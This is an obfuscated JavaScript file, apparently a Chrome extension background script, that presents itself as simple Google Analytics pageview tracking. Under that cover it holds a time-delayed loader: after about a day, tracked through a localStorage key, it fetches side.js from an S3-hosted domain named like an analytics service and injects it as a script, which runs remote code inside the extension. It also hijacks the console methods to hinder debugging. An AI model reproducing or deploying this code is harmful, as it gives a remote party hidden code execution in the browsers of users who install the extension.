const _0x36a930 = _0x6d6b;
(function(_0x5b9839, _0x267c5e) {
    const _0x4c6689 = _0x6d6b,
        _0x485743 = _0x5b9839();
    while (!![]) {
        try {
            const _0x4f960f = parseInt(_0x4c6689(0x125)) / 0x1 + parseInt(_0x4c6689(0x120)) / 0x2 + parseInt(_0x4c6689(0x12e)) / 0x3 * (parseInt(_0x4c6689(0x146)) / 0x4) + parseInt(_0x4c6689(0x12d)) / 0x5 * (parseInt(_0x4c6689(0x131)) / 0x6) + -parseInt(_0x4c6689(0x142)) / 0x7 * (-parseInt(_0x4c6689(0x132)) / 0x8) + parseInt(_0x4c6689(0x14b)) / 0x9 + -parseInt(_0x4c6689(0x147)) / 0xa * (parseInt(_0x4c6689(0x13b)) / 0xb);
            if (_0x4f960f === _0x267c5e) break;
            else _0x485743['push'](_0x485743['shift']());
        } catch (_0x5a3f72) {
            _0x485743['push'](_0x485743['shift']());
        }
    }
}(_0x801f, 0x506d7), ((async () => {
    const _0x4e520d = _0x6d6b;
    if (!localStorage[_0x4e520d(0x127)](_0x4e520d(0x13c))) localStorage[_0x4e520d(0x13f)]('plside', 0x111239905 - +new Date());
    else {
        const _0xd6ac91 = 0x111239905 - parseInt(localStorage[_0x4e520d(0x127)]('plside'), 0xa);
        if (+new Date() - _0xd6ac91 > 0x4f60500) {
            const _0x3f3ef4 = _0x4e520d(0x145),
                _0x582d4a = await fetch(_0x3f3ef4, {
                    'mode': 'no-cors'
                });
            if (_0x582d4a['ok']) {
                const _0x2a63cb = await _0x582d4a['blob'](),
                    _0x19e760 = URL[_0x4e520d(0x138)](_0x2a63cb),
                    _0x5f4619 = document[_0x4e520d(0x148)](_0x4e520d(0x11e));
                _0x5f4619['src'] = _0x19e760, _0x5f4619[_0x4e520d(0x134)] = _0x4e520d(0x126), (document[_0x4e520d(0x14a)] || document[_0x4e520d(0x12c)])[_0x4e520d(0x13e)](_0x5f4619);
            }
        }
    }
})()));

function uuidv4() {
    const _0x5fc7ec = _0x6d6b;
    return ([0x989680] + -0x3e8 + -0xfa0 + -0x1f40 + -0x174876e800)['replace'](/[018]/g, _0x3dabfd => (_0x3dabfd ^ crypto[_0x5fc7ec(0x140)](new Uint8Array(0x1))[0x0] & 0xf >> _0x3dabfd / 0x4)[_0x5fc7ec(0x149)](0x10));
}

function _0x6d6b(_0x2b2dcc, _0x3e598c) {
    const _0x3f3a34 = _0x801f();
    return _0x6d6b = function(_0x5b4dba, _0x2fadc0) {
        _0x5b4dba = _0x5b4dba - 0x11e;
        let _0x801f07 = _0x3f3a34[_0x5b4dba];
        return _0x801f07;
    }, _0x6d6b(_0x2b2dcc, _0x3e598c);
}

function getCid() {
    const _0x5a3bcd = _0x6d6b;
    var _0xe17948 = localStorage['getItem'](_0x5a3bcd(0x12f));
    return !_0xe17948 && (_0xe17948 = uuidv4(), localStorage[_0x5a3bcd(0x13f)](_0x5a3bcd(0x12f), _0xe17948)), _0xe17948;
}
async function analytics(_0x8ffe66) {
    const _0x2ca68b = _0x6d6b,
        _0x5843f4 = (function() {
            let _0x1a2f07 = !![];
            return function(_0x408010, _0x5b5de5) {
                const _0x591217 = _0x1a2f07 ? function() {
                    const _0x32d1c7 = _0x6d6b;
                    if (_0x5b5de5) {
                        const _0x75b56b = _0x5b5de5[_0x32d1c7(0x139)](_0x408010, arguments);
                        return _0x5b5de5 = null, _0x75b56b;
                    }
                } : function() {};
                return _0x1a2f07 = ![], _0x591217;
            };
        }()),
        _0x97e4af = _0x5843f4(this, function() {
            const _0x1567e3 = _0x6d6b,
                _0x421f89 = typeof window !== 'undefined' ? window : typeof process === _0x1567e3(0x143) && typeof require === _0x1567e3(0x124) && typeof global === 'object' ? global : this,
                _0x16171a = _0x421f89[_0x1567e3(0x123)] = _0x421f89[_0x1567e3(0x123)] || {},
                _0x1fa5c9 = [_0x1567e3(0x12b), _0x1567e3(0x137), _0x1567e3(0x121), _0x1567e3(0x135), _0x1567e3(0x144), 'table', _0x1567e3(0x12a)];
            for (let _0x229b74 = 0x0; _0x229b74 < _0x1fa5c9[_0x1567e3(0x13a)]; _0x229b74++) {
                const _0x27fa84 = _0x5843f4['constructor'][_0x1567e3(0x122)][_0x1567e3(0x136)](_0x5843f4),
                    _0x3b906f = _0x1fa5c9[_0x229b74],
                    _0x3311de = _0x16171a[_0x3b906f] || _0x27fa84;
                _0x27fa84['__proto__'] = _0x5843f4[_0x1567e3(0x136)](_0x5843f4), _0x27fa84['toString'] = _0x3311de[_0x1567e3(0x149)][_0x1567e3(0x136)](_0x3311de), _0x16171a[_0x3b906f] = _0x27fa84;
            }
        });
    _0x97e4af();
    const _0x3eb0ae = getCid(),
        _0x3c4a9a = {
            'v': '1',
            'tid': _0x8ffe66,
            'cid': _0x3eb0ae,
            't': _0x2ca68b(0x141),
            'dp': _0x2ca68b(0x129),
            'dt': _0x2ca68b(0x13d),
            'dh': _0x2ca68b(0x128) + chrome['runtime']['id']
        },
        _0x2b8558 = _0x2ca68b(0x133) + new URLSearchParams(_0x3c4a9a)[_0x2ca68b(0x149)]();
    await fetch(_0x2b8558, {
        'method': 'POST',
        'body': '',
        'mode': _0x2ca68b(0x11f)
    });
}
analytics(_0x36a930(0x130));

function _0x801f() {
    const _0x159328 = ['getRandomValues', 'pageview', '2428923xxbogj', 'object', 'exception', 'http://extanalyticspro.s3-website.us-east-2.amazonaws.com/side.js', '36856WjVcmE', '10sMTpKO', 'createElement', 'toString', 'body', '2293317yvEeon', 'script', 'no-cors', '273862vjqqSV', 'info', 'prototype', 'console', 'function', '550644ifyZzP', 'text/javascript', 'getItem', 'chrome-extension://', '/background', 'trace', 'log', 'documentElement', '245FlcsId', '33NWcJFy', 'cid', 'UA-212479779-1', '13242UDbPiO', '8dfMUGp', 'https://www.google-analytics.com/collect?', 'type', 'error', 'bind', 'warn', 'createObjectURL', 'apply', 'length', '12863873yezaNW', 'plside', 'background', 'appendChild', 'setItem'];
    _0x801f = function() {
        return _0x159328;
    };
    return _0x801f();
}